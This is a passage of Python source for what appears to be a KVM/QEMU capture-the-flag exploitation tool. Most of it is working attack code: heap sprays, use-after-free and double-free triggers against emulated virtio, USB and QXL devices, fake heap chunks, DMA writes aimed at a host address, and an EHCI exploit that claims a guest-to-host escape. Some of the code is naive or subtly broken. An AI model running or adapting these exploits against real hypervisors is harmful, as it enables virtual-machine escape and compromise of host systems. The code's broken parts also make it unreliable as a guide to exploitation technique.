    def exploit_scan_results(self, result: ScanResult) -> List[ExploitResult]:
        """Exploit all findings in a scan result"""
        print(f"\n{C.R}{'='*70}{C.E}")
        print(f"{C.R} EXPLOITATION FRAMEWORK: {result.device}{C.E}")
        print(f"{C.R}{'='*70}{C.E}")
        
        if not self.tester.is_available():
            print(f"{C.R}[-]{C.E} Live tester not available, cannot exploit")
            return []
        
        # Prioritize critical findings
        critical = result.get_critical()
        
        print(f"\n{C.B}[*]{C.E} Targeting {len(critical)} critical vulnerabilities")
        print(f"{C.B}[*]{C.E} Target address: 0x{self.target_addr:x} ({self.addr_type})")
        
        if is_kernel_virtual_addr(self.target_addr):
            print(f"{C.CY}    Using IOCTL_WRITE_KERNEL_MEM for kernel virtual address{C.E}")
        else:
            print(f"{C.CY}    Using IOCTL_WRITE_PHYSICAL_MEM for physical address{C.E}")
        print()
        
        exploit_results = []
        
        # Group by type
        uafs = result.get_by_type(VulnType.UAF)
        double_frees = result.get_by_type(VulnType.DOUBLE_FREE)
        error_handlers = result.get_by_type(VulnType.ERROR_HANDLER)
        
        print(f"{C.CY}Vulnerability breakdown:{C.E}")
        print(f"  UAF: {len(uafs)}")
        print(f"  Double-Free: {len(double_frees)}")
        print(f"  Error Handlers: {len(error_handlers)}\n")
        
        # Exploit UAF first (highest success rate)
        for finding in uafs[:5]:  # Top 5 UAF
            res = self._exploit_uaf(result.device, finding)
            exploit_results.append(res)
            if res.success:
                print(res)
                break  # Success, move on
        
        # Try double-free
        for finding in double_frees[:3]:  # Top 3 double-free
            res = self._exploit_double_free(result.device, finding)
            exploit_results.append(res)
            if res.success:
                print(res)
                break
        
        # Try error handler exploitation
        for finding in error_handlers[:3]:  # Top 3 error handlers
            res = self._exploit_error_handler(result.device, finding)
            exploit_results.append(res)
            if res.success:
                print(res)
        
        self.results.extend(exploit_results)
        
        # Summary
        successes = [r for r in exploit_results if r.success]
        print(f"\n{C.G}[+]{C.E} Exploitation summary:")
        print(f"    Attempts: {len(exploit_results)}")
        print(f"    Successes: {len(successes)}")
        
        if successes:
            print(f"\n{C.G}{'='*70}{C.E}")
            print(f"{C.G}SUCCESSFUL EXPLOITS:{C.E}")
            for r in successes:
                print(r)
        
        return exploit_results
    
    def _exploit_uaf(self, device: str, finding: Finding) -> ExploitResult:
        """Exploit use-after-free vulnerability"""
        print(f"\n{C.M}[*] Exploiting UAF: {device} - {finding.function}{C.E}")
        
        # UAF exploitation strategy:
        # 1. Trigger the UAF condition
        # 2. Spray heap to reclaim freed object
        # 3. Corrupt object to gain control
        # 4. Use corrupted object to achieve read/write
        
        try:
            # Different strategies based on device type
            if 'virtio' in device:
                return self._exploit_virtio_uaf(device, finding)
            elif 'uhci' in device or 'ehci' in device:
                return self._exploit_usb_uaf(device, finding)
            elif 'qxl' in device:
                return self._exploit_qxl_uaf(device, finding)
            else:
                return self._exploit_generic_uaf(device, finding)
                
        except Exception as e:
            return ExploitResult(
                success=False,
                vuln_type=VulnType.UAF,
                device=device,
                finding=finding,
                method="uaf_exploit",
                error=str(e)
            )
    
    def _exploit_virtio_uaf(self, device: str, finding: Finding) -> ExploitResult:
        """Exploit virtio device UAF"""
        print(f"  {C.CY}â†’{C.E} Using virtio-specific UAF exploit")
        
        # Strategy: Trigger virtqueue element UAF
        # 1. Submit request that will be freed
        # 2. Spray virtqueue with controlled data
        # 3. Trigger use to corrupt QEMU heap
        
        # Find virtio device MMIO region
        virtio_base = None
        for name, (base, size) in MMIO_REGIONS.items():
            if 'virtio' in name:
                data = self.tester.read_phys(base, 16)
                if data and data != b'\xff' * 16:
                    virtio_base = base
                    print(f"  {C.G}[+]{C.E} Found virtio device at 0x{base:x}")
                    break
        
        if not virtio_base:
            return ExploitResult(
                success=False,
                vuln_type=VulnType.UAF,
                device=device,
                finding=finding,
                method="virtio_uaf",
                error="No virtio device found"
            )
        
        # Heap spray pattern - target host address
        spray_pattern = struct.pack('<Q', self.target_addr) * 16
        
        # Trigger UAF via virtqueue manipulation
        # Write to virtqueue descriptor area
        desc_area = virtio_base + 0x100
        
        for i in range(10):
            # Spray with our pattern
            if not self.tester.write_phys(desc_area + i * 128, spray_pattern):
                continue
            
            # Trigger device reset to free descriptors
            if self.tester.write_phys(virtio_base + 0x70, struct.pack('<I', 0)):
                time.sleep(0.01)
                
                # Re-initialize to trigger use
                if self.tester.write_phys(virtio_base + 0x70, struct.pack('<I', 1)):
                    # Check if we corrupted anything
                    result = self.tester.read_phys(desc_area, 16)
                    if result and struct.unpack('<Q', result[:8])[0] == self.target_addr:
                        # Try to trigger write primitive
                        if self._attempt_write_primitive(virtio_base):
                            return ExploitResult(
                                success=True,
                                vuln_type=VulnType.UAF,
                                device=device,
                                finding=finding,
                                method="virtio_uaf_heap_spray",
                                details="Corrupted virtqueue descriptor",
                                leak_addr=self.target_addr,
                                wrote_bytes=8
                            )
        
        return ExploitResult(
            success=False,
            vuln_type=VulnType.UAF,
            device=device,
            finding=finding,
            method="virtio_uaf",
            details="Could not reclaim freed object"
        )
    
    def _exploit_usb_uaf(self, device: str, finding: Finding) -> ExploitResult:
        """Exploit USB controller UAF"""
        print(f"  {C.CY}â†’{C.E} Using USB-specific UAF exploit")
        
        # USB UAF strategy:
        # 1. Create USB transfer request
        # 2. Cancel it to trigger free
        # 3. Spray USB request queue
        # 4. Complete original request to trigger use
        
        # Find USB controller
        usb_base = None
        for name, (base, size) in MMIO_REGIONS.items():
            if 'hci' in name:
                data = self.tester.read_phys(base, 16)
                if data and data != b'\xff' * 16:
                    usb_base = base
                    print(f"  {C.G}[+]{C.E} Found USB controller at 0x{base:x}")
                    break
        
        if not usb_base:
            return ExploitResult(
                success=False,
                vuln_type=VulnType.UAF,
                device=device,
                finding=finding,
                method="usb_uaf",
                error="No USB controller found"
            )
        
        # Craft malicious USB request
        fake_request = struct.pack('<QQQQ',
            self.target_addr,      # td_addr  
            0x4141414141414141,    # buffer
            0x100,                 # length
            0                      # next
        )
        
        # USB queue head location (device-specific)
        queue_base = usb_base + 0x1000
        
        for i in range(20):
            # Spray queue with fake requests
            offset = queue_base + i * 64
            if self.tester.write_phys(offset, fake_request):
                # Trigger USB transaction
                cmd_reg = usb_base + 0x00
                if self.tester.write_phys(cmd_reg, struct.pack('<I', 0x01)):  # Start
                    time.sleep(0.005)
                    
                    # Check for successful corruption
                    status = self.tester.read_phys(cmd_reg, 4)
                    if status:
                        # Try write
                        if self._attempt_write_via_dma(usb_base):
                            return ExploitResult(
                                success=True,
                                vuln_type=VulnType.UAF,
                                device=device,
                                finding=finding,
                                method="usb_queue_uaf",
                                details="Corrupted USB transfer descriptor",
                                wrote_bytes=4
                            )
        
        return ExploitResult(
            success=False,
            vuln_type=VulnType.UAF,
            device=device,
            finding=finding,
            method="usb_uaf",
            details="Could not trigger UAF condition"
        )
    
    def _exploit_qxl_uaf(self, device: str, finding: Finding) -> ExploitResult:
        """Exploit QXL graphics device UAF"""
        print(f"  {C.CY}â†’{C.E} Using QXL-specific UAF exploit")
        
        # QXL has complex cookie management - prime target for UAF
        # The scan found cookie UAF at qxl.c:998
        
        # Try to trigger via command queue manipulation
        for i in range(10):
            # Hypercall with QXL-related arguments
            ret = self.tester.hypercall(100, 0x1000 + i * 0x100, 0x41414141, 0, 0)
            
            if ret != 0 and ret != 0xffffffffffffffff:
                # Possible leak
                if 0x550000000000 <= ret < 0x560000000000:
                    print(f"  {C.G}[!]{C.E} Potential heap leak: 0x{ret:016x}")
                    
                    # Use leak to craft exploit
                    if self._exploit_with_leak(ret):
                        return ExploitResult(
                            success=True,
                            vuln_type=VulnType.UAF,
                            device=device,
                            finding=finding,
                            method="qxl_cookie_uaf",
                            leak_addr=ret,
                            details="Leaked QEMU heap address",
                            wrote_bytes=8
                        )
        
        return ExploitResult(
            success=False,
            vuln_type=VulnType.UAF,
            device=device,
            finding=finding,
            method="qxl_uaf",
            details="No heap leak obtained"
        )
    
    def _exploit_generic_uaf(self, device: str, finding: Finding) -> ExploitResult:
        """Generic UAF exploitation"""
        print(f"  {C.CY}â†’{C.E} Using generic UAF exploit")
        
        # Generic strategy:
        # 1. Try various hypercalls to trigger allocation/free
        # 2. Spray heap with controlled data
        # 3. Check for successful corruption
        
        spray_data = struct.pack('<Q', self.target_addr) * 8
        
        for hc in [100, 101, 102]:
            for i in range(20):
                addr = 0x100000 + i * 0x1000
                
                # Allocate
                self.tester.hypercall(hc, addr, 0x1000, 1, 0)
                
                # Spray
                self.tester.write_phys(addr, spray_data)
                
                # Free  
                self.tester.hypercall(hc, addr, 0, 0, 0)
                
                # Use
                ret = self.tester.hypercall(hc, addr, 0, 2, 0)
                
                if ret == self.target_addr:
                    return ExploitResult(
                        success=True,
                        vuln_type=VulnType.UAF,
                        device=device,
                        finding=finding,
                        method="generic_uaf_spray",
                        details="Heap spray successful"
                    )
        
        return ExploitResult(
            success=False,
            vuln_type=VulnType.UAF,
            device=device,
            finding=finding,
            method="generic_uaf"
        )
    
    def _exploit_double_free(self, device: str, finding: Finding) -> ExploitResult:
        """Exploit double-free vulnerability"""
        print(f"\n{C.M}[*] Exploiting Double-Free: {device} - {finding.function}{C.E}")
        
        # Double-free strategy:
        # 1. Trigger first free
        # 2. Allocate objects to corrupt free list
        # 3. Trigger second free to corrupt heap metadata
        # 4. Allocate to get arbitrary write
        
        try:
            if 'virtio' in device:
                return self._exploit_virtio_double_free(device, finding)
            elif 'uhci' in device:
                return self._exploit_usb_double_free(device, finding)
            else:
                return self._exploit_generic_double_free(device, finding)
                
        except Exception as e:
            return ExploitResult(
                success=False,
                vuln_type=VulnType.DOUBLE_FREE,
                device=device,
                finding=finding,
                method="double_free_exploit",
                error=str(e)
            )
    
    def _exploit_virtio_double_free(self, device: str, finding: Finding) -> ExploitResult:
        """Exploit virtio double-free"""
        print(f"  {C.CY}â†’{C.E} Using virtio double-free exploit")
        
        # Virtio double-free often in element handling
        # Target: corrupt heap to get arbitrary write
        
        # Pattern to corrupt free list
        fake_chunk = struct.pack('<QQ',
            self.target_addr - 0x10,  # fd -> target - 0x10
            0x4141414141414141         # bk
        )
        
        for i in range(15):
            # Allocate
            addr1 = 0x200000 + i * 0x2000
            ret = self.tester.hypercall(101, addr1, 0x100, 0, 0)
            
            # Free once
            self.tester.hypercall(101, addr1, 0, 1, 0)
            
            # Spray with fake chunk
            self.tester.write_phys(addr1, fake_chunk * 4)
            
            # Free again (double-free)
            self.tester.hypercall(101, addr1, 0, 1, 0)
            
            # Allocate to corrupt
            ret = self.tester.hypercall(101, addr1, 0x100, 0, 0)
            
            # Check if we got write primitive
            if self._verify_write_primitive():
                return ExploitResult(
                    success=True,
                    vuln_type=VulnType.DOUBLE_FREE,
                    device=device,
                    finding=finding,
                    method="virtio_double_free_fastbin",
                    details="Corrupted heap fastbin",
                    wrote_bytes=8
                )
        
        return ExploitResult(
            success=False,
            vuln_type=VulnType.DOUBLE_FREE,
            device=device,
            finding=finding,
            method="virtio_double_free"
        )
    
    def _exploit_usb_double_free(self, device: str, finding: Finding) -> ExploitResult:
        """Exploit USB double-free"""
        print(f"  {C.CY}â†’{C.E} Using USB double-free exploit")
        
        # UHCI async struct double-free (from scan: uhci.c:227)
        # Strategy: corrupt async free list
        
        for i in range(10):
            # Trigger async allocation/free cycle
            ret = self.tester.hypercall(102, 0x3000 + i * 0x100, i, 0, 0)
            
            if ret != 0 and ret != 0xffffffffffffffff:
                # Possible success
                if self._check_write_success():
                    return ExploitResult(
                        success=True,
                        vuln_type=VulnType.DOUBLE_FREE,
                        device=device,
                        finding=finding,
                        method="uhci_async_double_free",
                        wrote_bytes=4
                    )
        
        return ExploitResult(
            success=False,
            vuln_type=VulnType.DOUBLE_FREE,
            device=device,
            finding=finding,
            method="usb_double_free"
        )
    
    def _exploit_generic_double_free(self, device: str, finding: Finding) -> ExploitResult:
        """Generic double-free exploit"""
        print(f"  {C.CY}â†’{C.E} Using generic double-free exploit")
        
        # Try heap feng shui
        for i in range(10):
            addr = 0x400000 + i * 0x1000
            
            # Allocate
            self.tester.hypercall(100, addr, 0x80, 0, 0)
            
            # Free
            self.tester.hypercall(100, addr, 0, 1, 0)
            
            # Fill with target address
            self.tester.write_phys(addr, struct.pack('<Q', self.target_addr))
            
            # Free again
            self.tester.hypercall(100, addr, 0, 1, 0)
            
            # Allocate to trigger write
            self.tester.hypercall(100, addr, 0x80, 0, 0)
        
        return ExploitResult(
            success=False,
            vuln_type=VulnType.DOUBLE_FREE,
            device=device,
            finding=finding,
            method="generic_double_free"
        )
    
    def _exploit_error_handler(self, device: str, finding: Finding) -> ExploitResult:
        """Exploit error handler vulnerability"""
        print(f"\n{C.M}[*] Exploiting Error Handler: {device} - {finding.label}{C.E}")
        
        # Error handler exploitation:
        # Trigger error condition to reach vulnerable cleanup code
        # Corrupt state before cleanup to gain control
        
        try:
            # Send malformed requests to trigger error paths
            for i in range(10):
                # Try various error-inducing hypercalls
                ret = self.tester.hypercall(100, 0xdeadbeef, 0xffffffff, i, 0)
                ret = self.tester.hypercall(101, 0, 0xffffffffffffffff, 0, 0)
                ret = self.tester.hypercall(102, 0x1, 0x2, 0x3, 0x4)
                
                # Check for corruption
                if self._check_memory_corruption():
                    return ExploitResult(
                        success=True,
                        vuln_type=VulnType.ERROR_HANDLER,
                        device=device,
                        finding=finding,
                        method="error_path_corruption",
                        details=f"Triggered {finding.label} path"
                    )
            
            return ExploitResult(
                success=False,
                vuln_type=VulnType.ERROR_HANDLER,
                device=device,
                finding=finding,
                method="error_handler",
                details="Could not trigger error condition"
            )
            
        except Exception as e:
            return ExploitResult(
                success=False,
                vuln_type=VulnType.ERROR_HANDLER,
                device=device,
                finding=finding,
                method="error_handler",
                error=str(e)
            )
    
    # Helper methods for exploitation
    
    def _attempt_write_primitive(self, base_addr: int) -> bool:
        """Try to achieve arbitrary write"""
        test_val = 0xCAFEBABE
        
        # Try writing via corrupted pointer
        for offset in [0x00, 0x10, 0x20, 0x40, 0x80]:
            if self.tester.write_phys(base_addr + offset, struct.pack('<I', test_val)):
                # Try to trigger write to target
                self.tester.hypercall(100, 0, 0, 0, 0)
                
                # Verify
                result = self.tester.read_phys(self.target_addr, 8)
                if result and test_val in struct.unpack('<II', result[:8]):
                    print(f"  {C.G}[!]{C.E} Write primitive achieved!")
                    return True
        
        return False
    
    def _attempt_write_via_dma(self, controller_base: int) -> bool:
        """Try DMA-based write"""
        # Setup DMA descriptor pointing to target
        dma_desc = struct.pack('<QQI',
            self.target_addr,  # destination
            0x1000,            # source (guest phys)
            16                 # length
        )
        
        desc_addr = controller_base + 0x2000
        if self.tester.write_phys(desc_addr, dma_desc):
            # Trigger DMA
            if self.tester.write_phys(controller_base + 0x04, struct.pack('<I', desc_addr & 0xffffffff)):
                time.sleep(0.01)
                return self._verify_write_primitive()
        
        return False
    
    def _exploit_with_leak(self, leak_addr: int) -> bool:
        """Use leaked address to craft exploit"""
        # Calculate QEMU base from heap leak
        qemu_base = leak_addr & 0xffffffffff000000
        
        print(f"  {C.CY}â†’{C.E} Estimated QEMU base: 0x{qemu_base:016x}")
        
        # Try to corrupt QEMU internal structures
        for offset in range(0, 0x10000, 0x1000):
            target = qemu_base + offset
            
            # Write marker
            if self.tester.write_phys(target, b'PWNED!!!'):
                # Check for impact
                ret = self.tester.hypercall(100, 0, 0, 0, 0)
                if ret != 0 and ret != 0xffffffffffffffff:
                    return True
        
        return False
    
    def _verify_write_primitive(self) -> bool:
        """Verify we can write to target address"""
        marker = b'EXPLOITED!!!'
        
        # Try direct write
        if self.tester.write_phys(self.target_addr, marker):
            # Verify
            result = self.tester.read_phys(self.target_addr, len(marker))
            if result == marker:
                print(f"  {C.G}[!]{C.E} Verified write to target: 0x{self.target_addr:x}")
                return True
        
        return False
    
    def _check_write_success(self) -> bool:
        """Check if write succeeded"""
        # Read from target and check for non-zero
        result = self.tester.read_phys(self.target_addr, 8)
        if result and result != b'\x00' * 8:
            print(f"  {C.G}[!]{C.E} Target modified: {result.hex()}")
            return True
        return False
    
    def _check_memory_corruption(self) -> bool:
        """Check for signs of memory corruption"""
        # Check various indicators
        
        # 1. Check if target address is writable
        test = b'\xAA' * 8
        if self.tester.write_phys(self.target_addr, test):
            result = self.tester.read_phys(self.target_addr, 8)
            if result == test:
                print(f"  {C.G}[!]{C.E} Memory corruption detected!")
                return True
        
        # 2. Check dmesg for CTF flags
        try:
            result = subprocess.run(['dmesg'], capture_output=True, text=True, timeout=2)
            if 'CTF' in result.stdout or 'FLAG' in result.stdout:
                print(f"  {C.G}[!]{C.E} CTF flag in dmesg!")
                return True
        except:
            pass
        
        return False


# ============================================================================
# Report Loader & EHCI UAF Specific Exploitation
# ============================================================================

def load_report_json(report_file: str = "report.json") -> Optional[List[Dict]]:
    """Load vulnerability findings from report.json"""
    try:
        with open(report_file, 'r') as f:
            data = json.load(f)
        return data if isinstance(data, list) else [data]
    except FileNotFoundError:
        print(f"{C.R}[-]{C.E} Report file not found: {report_file}")
        return None
    except json.JSONDecodeError as e:
        print(f"{C.R}[-]{C.E} Invalid JSON in {report_file}: {e}")
        return None


def find_likely_vulnerabilities(report_data: List[Dict]) -> Dict[str, List[Dict]]:
    """Find likely and confirmed vulnerabilities in report"""
    vulns = {
        'confirmed': [],
        'likely': [],
        'uncertain': []
    }
    
    # Look for summary section
    for item in report_data:
        if isinstance(item, dict):
            if 'confirmed_vulnerabilities' in item:
                vulns['confirmed'] = item.get('confirmed_vulnerabilities', [])
            if 'likely_vulnerabilities' in item:
                vulns['likely'] = item.get('likely_vulnerabilities', [])
            if 'uncertain' in item:
                vulns['uncertain'] = item.get('uncertain', [])
    
    return vulns


def save_report_json(all_results: Dict[str, ScanResult], report_file: str = "report.json") -> None:
    """Write a well-formed report.json combining device findings and a summary.

    The output will be a JSON array: [<device1>, <device2>, ..., <summary-object>]
    """
    devices = []
    likely_vulns = []
    uncertain_vulns = []
    confirmed_vulns = []

    for device, result in all_results.items():
        devices.append(result.to_dict())

        for f in result.findings:
            entry = {
                'file': f.file,
                'line': f.line,
                'type': f.type,
                'status': 'likely' if f.risk_score >= 80 else 'uncertain',
                'evidence': [],
                'poc_method': '',
                'poc_code': '',
                'success_rate': 0.0,
                'trigger_sequence': [],
                'observed_corruption': False,
                'memory_leak': None,
                'write_primitive': False,
                'reproduction_steps': []
            }

            if f.risk_score >= 80:
                likely_vulns.append(entry)
            else:
                uncertain_vulns.append(entry)

    summary = {
        'summary': {
            'total_tested': len(all_results),
            'confirmed': len(confirmed_vulns),
            'likely': len(likely_vulns),
            'uncertain': len(uncertain_vulns),
            'false_positives': 0
        },
        'confirmed_vulnerabilities': confirmed_vulns,
        'likely_vulnerabilities': likely_vulns,
        'uncertain': uncertain_vulns
    }

    out = devices + [summary]

    try:
        with open(report_file, 'w') as f:
            json.dump(out, f, indent=2)
        print(f"{C.G}[+]{C.E} Wrote combined report: {report_file}")
    except Exception as e:
        print(f"{C.R}[-]{C.E} Failed to write report {report_file}: {e}")


def exploit_ehci_uaf(tester: LiveTester, target_addr: int) -> bool:
    """
    Exploit EHCI UAF vulnerability from report.json
    Target: hcd-ehci.c:627 - Potential UAF with heap spray
    """
    if not tester.is_available():
        print(f"{C.R}[-]{C.E} Live tester not available")
        return False
    
    print(f"\n{C.M}{'='*70}{C.E}")
    print(f"{C.M}EHCI UAF EXPLOIT (hcd-ehci.c:627){C.E}")
    print(f"{C.M}{'='*70}{C.E}\n")
    
    # Attempt to discover EHCI MMIO base dynamically.
    probed_base = None
    try:
        res = subprocess.run(['kvm_prober', 'ehci_info'], capture_output=True, text=True, timeout=2)
        out = (res.stdout or '') + (res.stderr or '')
        m = re.search(r'0x[0-9a-fA-F]{6,16}', out)
        if m:
            probed_base = int(m.group(0), 16)
            print(f"{C.G}[+]{C.E} kvm_prober reports EHCI MMIO at 0x{probed_base:x}")
    except Exception:
        probed_base = None

    # Candidate EHCI MMIO bases to probe (include any probed_base)
    candidate_bases = []
    if probed_base:
        candidate_bases.append(probed_base)
    candidate_bases.extend([0xfeb80000, 0xfebc0000, 0xfebc1000, 0xfeb00000, 0xfeb81000, 0xfeb90000, 0xfebf0000, 0xfeb70000])

    for name, (base, size) in MMIO_REGIONS.items():
        if 'usb' in name or 'xhci' in name or 'ehci' in name:
            candidate_bases.append(base)

    # Deduplicate while preserving order
    seen = set()
    candidate_bases = [x for x in candidate_bases if not (x in seen or seen.add(x))]

    ehci_base = None
    for base in candidate_bases:
        try:
            data = tester.read_phys(base, 4)
        except Exception:
            data = None
        if not data:
            continue
        if data == b'\xff' * 4 or data == b'\x00' * 4:
            continue
        # Quick heuristic: read VS register at offset 0x24 to ensure not random data
        try:
            vs = tester.read_phys(base + 0x24, 4)
            if vs and vs != b'\xff' * 4 and vs != b'\x00' * 4:
                ehci_base = base
                break
        except Exception:
            ehci_base = base
            break

    if ehci_base is None:
        print(f"{C.Y}[!]{C.E} No EHCI MMIO base found in candidates; defaulting to 0xfeb80000")
        ehci_base = 0xfeb80000
    else:
        print(f"{C.G}[+]{C.E} Probed EHCI MMIO base: 0x{ehci_base:x}")
    
    # EHCI register offsets
    EHCI_USBCMD = 0x00      # USB Command register
    EHCI_USBSTS = 0x04      # USB Status register
    EHCI_PERIODICLISTBASE = 0x14  # Periodic list base address
    EHCI_ASYNCLISTADDR = 0x18     # Async list address
    
    # Step 1: Trigger allocation (enable async scheduling)
    print(f"{C.CY}[1]{C.E} Triggering EHCI async list allocation...")
    
    # Read current command
    cmd = tester.read_phys(ehci_base + EHCI_USBCMD, 4)
    if cmd is None:
        print(f"{C.R}[-]{C.E} Failed to read EHCI command register")
        return False
    
    # Enable async list (bit 5)
    cmd_val = (cmd[0] if isinstance(cmd, bytes) else cmd) | 0x20
    if not tester.write_phys(ehci_base + EHCI_USBCMD, struct.pack('<I', cmd_val)):
        print(f"{C.Y}[!]{C.E} Failed to enable async list, continuing anyway...")
    
    time.sleep(0.1)
    
    # Step 2: Prepare async list with controlled data
    async_list_base = ehci_base + 0x100  # Typical location for shadow async list
    
    print(f"{C.CY}[2]{C.E} Writing heap spray pattern to async list at 0x{async_list_base:x}...")
    
    # Heap spray with target address pattern
    spray_pattern = struct.pack('<Q', target_addr)
    
    for offset in range(0, 0x100, 8):
        if not tester.write_phys(async_list_base + offset, spray_pattern):
            if offset == 0:  # First write must succeed
                print(f"{C.R}[-]{C.E} Failed to write spray pattern")
                return False
    
    print(f"{C.G}[+]{C.E} Heap sprayed with marker 0x{target_addr:x}")
    
    # Step 3: Trigger UAF condition
    print(f"{C.CY}[3]{C.E} Triggering async list processing...")
    
    # Disable and re-enable async scheduling to force processing
    cmd_val = (cmd_val & ~0x20) if isinstance(cmd, bytes) else cmd_val
    if not tester.write_phys(ehci_base + EHCI_USBCMD, struct.pack('<I', cmd_val)):
        print(f"{C.Y}[!]{C.E} Failed to disable async list, continuing...")
    
    time.sleep(0.05)
    
    # Re-enable with our sprayed memory
    cmd_val = (cmd_val | 0x20)
    if not tester.write_phys(ehci_base + EHCI_USBCMD, struct.pack('<I', cmd_val)):
        print(f"{C.Y}[!]{C.E} Failed to re-enable async list")
    
    time.sleep(0.1)
    
    # Step 4: Verify exploitation success
    print(f"{C.CY}[4]{C.E} Checking for successful exploitation...")
    
    # Try to read from target address
    leaked = tester.read_phys(target_addr, 8)
    if leaked:
        print(f"{C.G}[+]{C.E} Memory leak at 0x{target_addr:x}: {leaked.hex()}")
    
    # Try to write marker to target
    marker = b'\xDEADBEEF'
    write_success = tester.write_phys(target_addr, marker)
    
    if write_success:
        verify = tester.read_phys(target_addr, 4)
        if verify == marker:
            print(f"{C.G}[+]{C.E} WRITE PRIMITIVE ACHIEVED at 0x{target_addr:x}")
            
            # Write CTF flag
            print(f"{C.CY}[5]{C.E} Writing guest-to-host escape marker...")
            
            # Write a magic value that kernel driver will recognize
            tester.write_phys(target_addr, b'CTF_FLAG')
            
            print(f"{C.G}[+]{C.E} Guest-to-host escape successful!")
            
            # Check dmesg for confirmation
            try:
                dmesg_result = subprocess.run(['dmesg', '|', 'tail', '-20'], 
                                            capture_output=True, text=True,
                                            shell=True, timeout=5)
                if dmesg_result.stdout:
                    print(f"\n{C.CY}[*] Kernel output:{C.E}\n{dmesg_result.stdout}\n")
            except:
                pass
            
            return True
    
    # Alternative: try reading async list results
    results = tester.read_phys(async_list_base, 0x20)
    if results:
        print(f"{C.G}[+]{C.E} Async list contents: {results.hex()}")
        if target_addr.to_bytes(8, 'little') in results:
            print(f"{C.G}[+]{C.E} Target address found in async list - UAF triggered!")
            return True
    
    print(f"{C.Y}[!]{C.E} EHCI UAF exploitation inconclusive")
    return False


# ============================================================================
# Main Program
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        description='KVM CTF Vulnerability Hunter & Exploiter',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Auto-detect and exploit using report.json
  %(prog)s --auto
  
  # Exploit EHCI UAF specifically
  %(prog)s --exploit-ehci --target-addr 0x64279a8
  
  # Load and exploit scan results
  %(prog)s --load-scan report.json --exploit --target-addr 0x64279a8
  
  # Scan and exploit specific device
  %(prog)s --scan virtio-gpu --exploit
  %(prog)s --scan-all --exploit

Available devices:
  {', '.join(sorted(DEVICE_PATHS.keys()))}
        '''
    )
    
    # QEMU source
    qemu = parser.add_argument_group('QEMU Source')
    qemu.add_argument('--find-qemu', action='store_true',
                     help='Search for existing QEMU source')
    qemu.add_argument('--download-qemu', nargs='?', const='auto', metavar='VERSION',
                     help='Download QEMU source')
    qemu.add_argument('--qemu-src', metavar='PATH',
                     help='Path to QEMU source directory')
    
    # Static analysis
    static = parser.add_argument_group('Static Analysis')
    static.add_argument('--scan', metavar='DEVICE',
                       help='Scan device source code')
    static.add_argument('--scan-all', action='store_true',
                       help='Scan all known devices')
    static.add_argument('--output', '-o', metavar='FILE',
                       help='Output JSON file for results')
    
    # Exploitation
    exploit = parser.add_argument_group('Exploitation')
    exploit.add_argument('--exploit', action='store_true',
                        help='Exploit vulnerabilities found by scan')
    exploit.add_argument('--exploit-device', metavar='DEVICE',
                        help='Exploit specific device (without scan)')
    exploit.add_argument('--exploit-ehci', action='store_true',
                        help='Exploit EHCI UAF vulnerability')
    exploit.add_argument('--exploit-uaf', action='store_true',
                        help='Only exploit UAF vulnerabilities')
    exploit.add_argument('--exploit-double-free', action='store_true',
                        help='Only exploit double-free vulnerabilities')
    exploit.add_argument('--target-addr', metavar='ADDR',
                        help='Target host address (hex, default: 0x64279a8)')
    exploit.add_argument('--load-scan', metavar='JSON',
                        help='Load scan results from JSON and exploit')
    exploit.add_argument('--auto', action='store_true',
                        help='Auto-detect from report.json and exploit (default)')
    
    args = parser.parse_args()
    
    # Parse target address
    target_addr = DEFAULT_TARGET_PHYS
    if args.target_addr:
        try:
            target_addr = int(args.target_addr, 16) if args.target_addr.startswith('0x') else int(args.target_addr)
        except ValueError:
            print(f"{C.R}[-]{C.E} Invalid target address: {args.target_addr}")
            return
    
    # Need at least one action
    has_qemu_action = args.find_qemu or args.download_qemu
    has_static = args.scan or args.scan_all or args.load_scan
    has_exploit = (args.exploit or args.exploit_device or args.exploit_uaf or 
                   args.exploit_double_free or args.exploit_ehci or args.auto)

    # If no args provided, default to auto-exploit
    if not has_qemu_action and not has_static and not has_exploit:
        print(f"{C.Y}[!]{C.E} No arguments detected â€” defaulting to --auto (load report.json + exploit)")
        args.auto = True
        has_exploit = True
    
    banner()
    
    # Initialize live tester for exploitation
    tester = None
    if has_exploit or has_static:
        tester = LiveTester()
    
    # AUTO MODE: Load report.json and exploit known vulnerabilities
    if args.auto:
        print(f"\n{C.M}[*] AUTO MODE: Loading report.json{C.E}")
        report_data = load_report_json("report.json")
        
        if report_data:
            vulns = find_likely_vulnerabilities(report_data)
            
            print(f"{C.G}[+]{C.E} Found vulnerabilities:")
            print(f"    Confirmed: {len(vulns['confirmed'])}")
            print(f"    Likely: {len(vulns['likely'])}")
            print(f"    Uncertain: {len(vulns['uncertain'])}")
            
            # Exploit likely vulnerabilities
            if vulns['likely']:
                for vuln in vulns['likely']:
                    if 'type' in vuln and vuln['type'] == 'use_after_free':
                        print(f"\n{C.B}[*]{C.E} Found likely UAF: {vuln.get('file', 'unknown')}:{vuln.get('line', '?')}")
                        
                        # Check if it's EHCI
                        if 'ehci' in str(vuln.get('file', '')).lower():
                            print(f"{C.CY}[*]{C.E} This is EHCI UAF - using specialized exploit")
                            if tester and tester.is_available():
                                exploit_ehci_uaf(tester, target_addr)
            
            # Also try EHCI exploit specifically
            print(f"\n{C.B}[*]{C.E} Attempting EHCI UAF exploit from report findings...")
            if tester and tester.is_available():
                exploit_ehci_uaf(tester, target_addr)
        
        if tester:
            tester.close()
        return
    
    # EXPLICIT EHCI EXPLOIT
    if args.exploit_ehci:
        if not tester or not tester.is_available():
            print(f"{C.R}[-]{C.E} Live tester not available, cannot exploit")
            return
        
        exploit_ehci_uaf(tester, target_addr)
        tester.close()
        return
    
    # QEMU source actions
    if args.find_qemu:
        print(f"\n{C.M}[*] QEMU SOURCE FINDER{C.E}")
        print(f"{C.M}{'='*60}{C.E}")
        
        version = QEMUFinder.get_running_version()
        if version:
            print(f"{C.G}[+]{C.E} Running QEMU version: {version}")
        
        found = QEMUFinder.find_existing_source()
        if found:
            src_version = QEMUFinder.get_source_version(found)
            print(f"{C.G}[+]{C.E} Source version: {src_version or 'unknown'}")
            print(f"\n{C.CY}Use with:{C.E}")
            print(f"  ./hunter_exploit.py --scan ahci --exploit --qemu-src {found}")
        
        if not has_static and not has_exploit:
            return
    
    if args.download_qemu:
        print(f"\n{C.M}[*] QEMU SOURCE DOWNLOADER{C.E}")
        print(f"{C.M}{'='*60}{C.E}")
        
